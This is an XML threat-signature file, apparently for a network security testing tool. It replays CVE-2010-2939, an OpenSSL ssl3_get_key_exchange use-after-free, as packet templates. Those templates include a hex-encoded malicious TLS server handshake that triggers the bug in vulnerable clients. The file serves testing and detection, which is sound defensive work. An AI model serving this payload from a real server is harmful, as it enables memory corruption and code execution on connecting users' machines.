<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="OpenSSL ssl3_get_key_exchange Use-After-Free Memory Corruption (IPv6 Version)"/>
    <EngDesc display="true" value="A memory corruption vulnerability exists in OpenSSL library. The vulnerability is due to an error in ssl3_get_key_exchange function while handling server key exchange message. If a certificate structure contains a crafted value, the vulnerable code could cause a double-free error.&#13;&#10;Remote attackers could exploit this vulnerability by enticing the target user to connect to a malicious server using a vulnerable version of the OpenSSL library. Successful exploitation may allow for arbitrary code execution with the privileges of the application using the OpenSSL library."/>
    <Intent display="true">
      <item value="CODE_EXECUTION"/>
    </Intent>
    <Protocol display="true" value="IPv6,TLS"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="OpenSSL_Project"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="OpenSSL"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="0.9.8_through_1.0.0a"/>
    </Known_Versions_Affected>
    <Credit display="true" value=""/>
    <CVEID display="true" value="CVE-2010-2939"/>
    <bugtraqID display="true" value=""/>
    <OSVDB display="true" value=""/>
    <Author display="true" value="Will Wang"/>
    <ID display="true" value="f1ac96731bd10313e34cf00198cbfe06"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value=""/>
    <ServerSideAttack display="true" value=""/>
    <SoftwareRevision display="true" value="2.0"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value=""/>
    <Valid_Traffic display="false" value=""/>
    <AccessVector display="false" value="NETWORK"/>
    <AccessComplexity display="false" value="MEDIUM"/>
    <Authentication display="false" value="NONE"/>
    <ConfImpact display="false" value="PARTIAL"/>
    <IntegImpact display="false" value="PARTIAL"/>
    <AvailImpact display="false" value="PARTIAL"/>
    <ImpactBias display="false" value=""/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="634233418405956023"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value="TCP"/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1287739818" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="srcIP" type="ImperfectControls.IPv6Address" value="null" index="K"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="L"/>
    <NamedVar name="TLSdestPort" type="ImperfectControls.Port" value="null" index="M"/>
  </Variables>
  <Loops>
    <for index="D">
      <for index="K"/>
      <for index="L"/>
      <for index="M"/>
    </for>
    <for index="F">
      <for index="L"/>
      <for index="K"/>
      <for index="M"/>
    </for>
    <for index="H">
      <for index="K"/>
      <for index="L"/>
      <for index="M"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="D" Count="">
    <Ethernet srcMac="00:0C:29:63:1A:F1" destMac="00:0C:29:55:C3:0D" pktType="0800">
      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$srcIP" Destination-Address="$destIP">
        <TCP srcPort="37934" destPort="$TLSdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="016D" Checksum="" UrgentPointer="0000" Options="0101080A29E6F3A599AA92BE" Payload="16030100CD010000C903014C89142D8204FC6D77726F6E086A24871980C42CF3D128D11B29BCDF55DB935800005CC014C00A0039003800880087C00FC00500350084C012C00800160013C00DC003000AC013C00900330032009A009900450044C00EC004002F009600410007C011C007C00CC002000500040015001200090014001100080006000300FF01000044000B000403000102000A00340032000100020003000400050006000700080009000A000B000C000D000E000F001000110012001300140015001600170018001900230000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IPv6>
    </Ethernet>
  </Output>
  <Output index="H" Count="">
    <Ethernet srcMac="00:0C:29:63:1A:F1" destMac="00:0C:29:55:C3:0D" pktType="0800">
      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$srcIP" Destination-Address="$destIP">
        <TCP srcPort="37934" destPort="$TLSdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="01DA" Checksum="" UrgentPointer="0000" Options="0101080A29E7067999AAA0E1" Payload="15030100020233" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IPv6>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="F" Count="">
      <Ethernet srcMac="00:0C:29:55:C3:0D" destMac="00:0C:29:63:1A:F1" pktType="0800">
        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="$srcIP">
          <TCP srcPort="$TLSdestPort" destPort="37934" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="006C" Checksum="" UrgentPointer="0000" Options="0101080A99AAA0E129E6F3A5" Payload="160301003D0200003903014C88CD11B471A84F461E132397E80645D41842CDDA033024375B61F93893F79700C014000011FF01000100000B0004030001020023000016030102810B00027D00027A000277308202733082021DA0030201020209009E230B0EB67E69AC300D06092A864886F70D0101050500305C310B300906035504061302474231123010060355040813094265726B73686972653110300E060355040713074E65776275727931173015060355040A130E4D7920436F6D70616E79204C7464310E300C060355040B130554656C7573301E170D3130303930383135323133325A170D3131303930383135323133325A305C310B300906035504061302474231123010060355040813094265726B73686972653110300E060355040713074E65776275727931173015060355040A130E4D7920436F6D70616E79204C7464310E300C060355040B130554656C7573305C300D06092A864886F70D0101010500034B003048024100DD57F23F77320B252AD45BF272466B3576BD9CF8E7E7606940150A7A5CC7FE91C4E0BCDD011C84B404C6F46DDF2A451AD2B8543EB243E9A800AF4CAA6A4B77AD0203010001A381C13081BE301D0603551D0E041604148F9327EF3C4682BEAE675F17646CB7AAB85BBECA30818E0603551D2304818630818380148F9327EF3C4682BEAE675F17646CB7AAB85BBECAA160A45E305C310B300906035504061302474231123010060355040813094265726B73686972653110300E060355040713074E65776275727931173015060355040A130E4D7920436F6D70616E79204C7464310E300C060355040B130554656C75738209009E230B0EB67E69AC300C0603551D13040530030101FF300D06092A864886F70D01010505000341005DFB8F73AB18408398BCBE19D31C1E6C2391CDA5916F63F7D70263D2DBE3A6B943D2AA30BED64255D0018FF07E3E6464026AD49F8ABD58DDCB721F3922A6E7C0160301008B0C00008703001741040465281329CF08AAAC13CE6C72ABD2E5E02FFC954922D0704892732AF33D92DBBC31D3453760754AA9738DDD3A175C90323E81C6ADC0C6AB4CFF4F4EABED3A810040DCC1A1D5C056D1BFC829D441CF3C60C3C5AAF9D5CCB5FAD2CC10121083745F185D3D960FA754DBB873832D761B9A96F682EB0C49767F3D98357DDE3B2909050116030100040E000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IPv6>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
